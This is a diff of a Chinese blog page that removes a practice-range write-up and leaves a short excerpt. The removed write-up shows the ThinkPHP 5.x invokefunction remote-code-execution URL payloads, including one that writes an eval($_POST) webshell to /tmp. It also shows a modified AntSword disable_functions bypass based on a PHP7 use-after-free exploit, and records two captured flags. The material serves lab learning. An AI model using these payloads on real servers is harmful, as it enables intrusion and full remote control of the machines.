@@ -358,7 +358,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2023-11-07 03:50:03" itemprop="dateModified" datetime="2023-11-07T03:50:03+08:00">2023-11-07</time>
+      <time title="修改时间：2023-11-07 03:56:56" itemprop="dateModified" datetime="2023-11-07T03:56:56+08:00">2023-11-07</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -395,93 +395,15 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <h1 id="一次魔改蚁剑bypass_disable_functions插件的打靶记录"><a class="markdownIt-Anchor" href="#一次魔改蚁剑bypass_disable_functions插件的打靶记录"></a> 一次魔改蚁剑bypass_disable_functions插件的打靶记录</h1>
-<h2 id="一-解题过程"><a class="markdownIt-Anchor" href="#一-解题过程"></a> 一、解题过程</h2>
-<h3 id="1尝试通用payload"><a class="markdownIt-Anchor" href="#1尝试通用payload"></a> ①：尝试通用payload</h3>
-<p>url：<a target="_blank" rel="noopener" href="http://1.117.101.154:30080/">http://1.117.101.154:30080/</a></p>
-<p>源码：<a target="_blank" rel="noopener" href="http://1.117.101.154:30080/thinkphp_5.0.22_with_extend.zip">http://1.117.101.154:30080/thinkphp_5.0.22_with_extend.zip</a></p>
-<p>已知：<img src="/2023/11/%E4%B8%80%E6%AC%A1%E9%AD%94%E6%94%B9%E8%9A%81%E5%89%91bypass-disable-functions%E6%8F%92%E4%BB%B6%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20231103182714323.png" alt="image-20231103182714323"></p>
-<p>读phpinfo()：</p>
-<p>tk5.x通用payload：</p>
-<p><code>?s=Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=-1</code></p>
-<p><img src="/2023/11/%E4%B8%80%E6%AC%A1%E9%AD%94%E6%94%B9%E8%9A%81%E5%89%91bypass-disable-functions%E6%8F%92%E4%BB%B6%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20231103182820721.png" alt="image-20231103182820721"></p>
-<p>得到<strong>disable_functions</strong></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set_time_limit,ini_set,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,putenv,error_log,dl,gc_collect_cycles,iconv,str_repeat,str_shuffle</span><br></pre></td></tr></table></figure>
-<p>可利用命令执行函数(均被ban掉）：</p>
-<blockquote>
-<p>exec()   x<br>
-shell_exec()   x<br>
-反引号`   x<br>
-passthru()   x<br>
-popen()   x<br>
-proc_open()   x<br>
-pcntl_exec() ：需要开启pcntl扩展    x<br>
-COM组件：Wscript.Shell和Shell.Application  x<br>
-dl()：通过加载自定义php扩展突破 disable_fucnitons指令的限制   x</p>
-<p>利用PHP内核变量绕过disable_functions   x</p>
-</blockquote>
-<p>文件包含通用payload：</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://1.117.101.154:30080/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=/tmp/tw.php&amp;vars[1][]=%3C%3Fphp%20echo(%22hello%20hacker%22)%3B%40eval(%24_POST%5B&#x27;tw&#x27;%5D)%3B%3F%3E</span><br></pre></td></tr></table></figure>
-<p>这一次包含能够返回你写入的字符串长度</p>
-<p><img src="/2023/11/%E4%B8%80%E6%AC%A1%E9%AD%94%E6%94%B9%E8%9A%81%E5%89%91bypass-disable-functions%E6%8F%92%E4%BB%B6%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20231103201016733.png" alt="image-20231103201016733"></p>
-<p>包含之后再次使用包含来读取上一次包含返回的内容</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://1.117.101.154:30080/?s=Index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=think\__include_file&amp;vars[1][]=/tmp/tw.php</span><br></pre></td></tr></table></figure>
-<p><img src="/2023/11/%E4%B8%80%E6%AC%A1%E9%AD%94%E6%94%B9%E8%9A%81%E5%89%91bypass-disable-functions%E6%8F%92%E4%BB%B6%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20231103201538864.png" alt="image-20231103201538864"></p>
-<p>访问包含的webshell一句话木马，发现能够被解析，掏出antsword直接连</p>
-<p><img src="/2023/11/%E4%B8%80%E6%AC%A1%E9%AD%94%E6%94%B9%E8%9A%81%E5%89%91bypass-disable-functions%E6%8F%92%E4%BB%B6%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20231103201659989.png" alt="image-20231103201659989"></p>
-<p>直接跳到根目录查看flag.flag文件</p>
-<p><img src="/2023/11/%E4%B8%80%E6%AC%A1%E9%AD%94%E6%94%B9%E8%9A%81%E5%89%91bypass-disable-functions%E6%8F%92%E4%BB%B6%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20231103201911477.png" alt="image-20231103201911477"></p>
-<p><mark>flag:  flag{FS_ROOT_49mAIg5AbsqbC7nP}</mark></p>
-<p>正当我长舒一口气的时候看到一个getrceflag的可进行文件：</p>
-<p><img src="/2023/11/%E4%B8%80%E6%AC%A1%E9%AD%94%E6%94%B9%E8%9A%81%E5%89%91bypass-disable-functions%E6%8F%92%E4%BB%B6%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20231107034136826.png" alt="image-20231107034136826"></p>
-<p>进入终端执行看看：</p>
-<p><img src="/2023/11/%E4%B8%80%E6%AC%A1%E9%AD%94%E6%94%B9%E8%9A%81%E5%89%91bypass-disable-functions%E6%8F%92%E4%BB%B6%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20231107034224434.png" alt="image-20231107034224434"></p>
-<p>发现限制了根目录，这时候又看到了还有一个 hint：</p>
-<p><img src="/2023/11/%E4%B8%80%E6%AC%A1%E9%AD%94%E6%94%B9%E8%9A%81%E5%89%91bypass-disable-functions%E6%8F%92%E4%BB%B6%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20231103202436181.png" alt="image-20231103202436181"></p>
-<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">恭喜你成功RCE！</span><br><span class="line">现在你需要<span class="keyword">Bypass </span><span class="keyword">disable_function。</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line">本环境可使用某种现成的<span class="keyword">bypass </span>PoC，但是由于<span class="keyword">ban了某些函数，因此你需要自行对该PoC进行一些你力所能及的修改。</span></span><br><span class="line"><span class="keyword"></span>至于是哪种PoC，嘿嘿？</span><br></pre></td></tr></table></figure>
-<p>直接使用蚁剑bypass disable_functions插件，这里就需要魔改一下因为被ban的函数太多了：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set_time_limit,ini_set,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,<span class="built_in">exec</span>,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,putenv,error_log,dl,gc_collect_cycles,iconv,str_repeat,str_shuffle</span><br></pre></td></tr></table></figure>
-<h3 id="2魔改细节请往后看"><a class="markdownIt-Anchor" href="#2魔改细节请往后看"></a> ②：魔改细节请往后看</h3>
-<p><img src="/2023/11/%E4%B8%80%E6%AC%A1%E9%AD%94%E6%94%B9%E8%9A%81%E5%89%91bypass-disable-functions%E6%8F%92%E4%BB%B6%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20231103204922812.png" alt="image-20231103204922812"></p>
-<p>加载魔改后的插件和对应的exp，点击开始：</p>
-<p><img src="/2023/11/%E4%B8%80%E6%AC%A1%E9%AD%94%E6%94%B9%E8%9A%81%E5%89%91bypass-disable-functions%E6%8F%92%E4%BB%B6%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20231103205100914.png" alt="image-20231103205100914"></p>
-<p>跳转到root目录，执行getrceflag程序</p>
-<p><img src="/2023/11/%E4%B8%80%E6%AC%A1%E9%AD%94%E6%94%B9%E8%9A%81%E5%89%91bypass-disable-functions%E6%8F%92%E4%BB%B6%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20231103205214990.png" alt="image-20231103205214990"></p>
-<p>获得第二个flag：</p>
-<p><mark>flag{RCE_2A7o4zrC2b9yviVp}</mark></p>
-<p>这个靶场到这儿就结束啦！！！下面就是插件魔改的详细过程。</p>
-<h2 id="二-魔改插件过程"><a class="markdownIt-Anchor" href="#二-魔改插件过程"></a> 二、魔改插件过程</h2>
-<h3 id="1被ban函数的位置以及确认exp"><a class="markdownIt-Anchor" href="#1被ban函数的位置以及确认exp"></a> ①：被ban函数的位置以及确认exp</h3>
-<p>首先确认php版本，加载插件：</p>
-<p><img src="/2023/11/%E4%B8%80%E6%AC%A1%E9%AD%94%E6%94%B9%E8%9A%81%E5%89%91bypass-disable-functions%E6%8F%92%E4%BB%B6%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20231107025022272.png" alt="image-20231107025022272"></p>
-<p>php7.2，先大概锁定两个exp: <code>PHP7 Backtrace UAF</code> 和<code>PHP7 GC with Certain Destructors UAF</code></p>
-<p>正常点击开始并不能达到bypass的作用，再结合提示(hint)所说：</p>
-<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">恭喜你成功RCE！</span><br><span class="line">现在你需要<span class="keyword">Bypass </span><span class="keyword">disable_function。</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line">本环境可使用某种现成的<span class="keyword">bypass </span>PoC，但是由于<span class="keyword">ban了某些函数，因此你需要自行对该PoC进行一些你力所能及的修改。</span></span><br><span class="line"><span class="keyword"></span>至于是哪种PoC，嘿嘿？</span><br></pre></td></tr></table></figure>
-<p>查看被ban掉的函数，在蚁剑的插件源码（位于antData\plugins\as_bypass_php_disable_functions-master\payload.js）中查找<strong>disable_function</strong>中下列函数</p>
-<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str_repeat,</span>str_shuffle</span><br></pre></td></tr></table></figure>
-<p>为什么仅排查这2个函数，其实对<strong>Bypass disable_function</strong>有一定查阅的师傅肯定能发现这2个函数之前的函数都是<strong>disable_function</strong>很常见的函数。</p>
-<p>在<strong>PHP7_Backtrace_UAF_EXP</strong>源码中找到</p>
-<p><mark><strong>str_repeat</strong></mark></p>
-<p><img src="/2023/11/%E4%B8%80%E6%AC%A1%E9%AD%94%E6%94%B9%E8%9A%81%E5%89%91bypass-disable-functions%E6%8F%92%E4%BB%B6%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20231107030223250.png" alt="image-20231107030223250"></p>
-<p><img src="/2023/11/%E4%B8%80%E6%AC%A1%E9%AD%94%E6%94%B9%E8%9A%81%E5%89%91bypass-disable-functions%E6%8F%92%E4%BB%B6%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20231107030300501.png" alt="image-20231107030300501"></p>
-<p><img src="/2023/11/%E4%B8%80%E6%AC%A1%E9%AD%94%E6%94%B9%E8%9A%81%E5%89%91bypass-disable-functions%E6%8F%92%E4%BB%B6%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20231107030346773.png" alt="image-20231107030346773"></p>
-<p><mark><strong>str_shuffle</strong></mark></p>
-<p><img src="/2023/11/%E4%B8%80%E6%AC%A1%E9%AD%94%E6%94%B9%E8%9A%81%E5%89%91bypass-disable-functions%E6%8F%92%E4%BB%B6%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20231107030529707.png" alt="image-20231107030529707"></p>
-<p>找到了被ban函数的位置和确认了exp，那么下一步就是如何魔改exp了。</p>
-<h3 id="2确认函数功能并手动实现"><a class="markdownIt-Anchor" href="#2确认函数功能并手动实现"></a> ②：确认函数功能并手动实现</h3>
-<p>第一步先确认两个函数的功能：</p>
-<p><code>str_repeat</code>：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#定义和用法</span></span><br><span class="line"><span class="title function_ invoke__">str_repeat</span>() 函数把字符串重复指定的次数。</span><br><span class="line"><span class="comment">#语法</span></span><br><span class="line"><span class="title function_ invoke__">str_repeat</span>(<span class="keyword">string</span>,repeat)</span><br><span class="line"><span class="comment">#参数	   描述</span></span><br><span class="line"><span class="keyword">string</span>	必需。规定要重复的字符串。</span><br><span class="line">repeat	必需。规定字符串将被重复的次数。必须大于等于 <span class="number">0</span></span><br></pre></td></tr></table></figure>
-<p><code>str_shuffle</code>:</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#定义和用法</span></span><br><span class="line"><span class="title function_ invoke__">str_shuffle</span>() 函数随机打乱字符串中的所有字符。</span><br><span class="line"><span class="comment">#语法</span></span><br><span class="line"><span class="title function_ invoke__">str_shuffle</span>(<span class="keyword">string</span>)</span><br><span class="line"><span class="comment">#参数	  描述</span></span><br><span class="line"><span class="keyword">string</span>	必需。规定要打乱的字符串。</span><br></pre></td></tr></table></figure>
-<p>确认了函数功能下面就是手动实现的过程了，<code>str_repeat()</code>就是一个循环就能替代，而<code>str_shuffle()</code>就是为了随机打乱<code>str_repeat('A', 79)</code>所生成的数，这里生成的为79个相同的A，打乱与否并不重要，所以<code>str_shuffle()</code>完全可以舍弃掉，那么接下啦就是手动实现<code>str_repeat()</code>的过程和结果啦：</p>
-<p><img src="/2023/11/%E4%B8%80%E6%AC%A1%E9%AD%94%E6%94%B9%E8%9A%81%E5%89%91bypass-disable-functions%E6%8F%92%E4%BB%B6%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20231107033415836.png" alt="image-20231107033415836"></p>
-<p><img src="/2023/11/%E4%B8%80%E6%AC%A1%E9%AD%94%E6%94%B9%E8%9A%81%E5%89%91bypass-disable-functions%E6%8F%92%E4%BB%B6%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20231107033340312.png" alt="image-20231107033340312"></p>
-<p><img src="/2023/11/%E4%B8%80%E6%AC%A1%E9%AD%94%E6%94%B9%E8%9A%81%E5%89%91bypass-disable-functions%E6%8F%92%E4%BB%B6%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20231107033445350.png" alt="image-20231107033445350"></p>
-<p>保存之后重启蚁剑（antsword），加载PHP7_Backtrace_UAF_EXP插件</p>
-<p><img src="/2023/11/%E4%B8%80%E6%AC%A1%E9%AD%94%E6%94%B9%E8%9A%81%E5%89%91bypass-disable-functions%E6%8F%92%E4%BB%B6%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20231107033803884.png" alt="image-20231107033803884"></p>
-<p>绕过<strong>disable_function</strong>，exp利用成功。到此本文就结束啦！</p>
-
+          <p>简单但是需要细心的打靶记录哈哈，蛮有趣的大佬轻点锤<img src="/2023/11/%E4%B8%80%E6%AC%A1%E9%AD%94%E6%94%B9%E8%9A%81%E5%89%91bypass-disable-functions%E6%8F%92%E4%BB%B6%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20231107035636001.png" alt="image-20231107035636001"></p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2023/11/%E4%B8%80%E6%AC%A1%E9%AD%94%E6%94%B9%E8%9A%81%E5%89%91bypass-disable-functions%E6%8F%92%E4%BB%B6%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
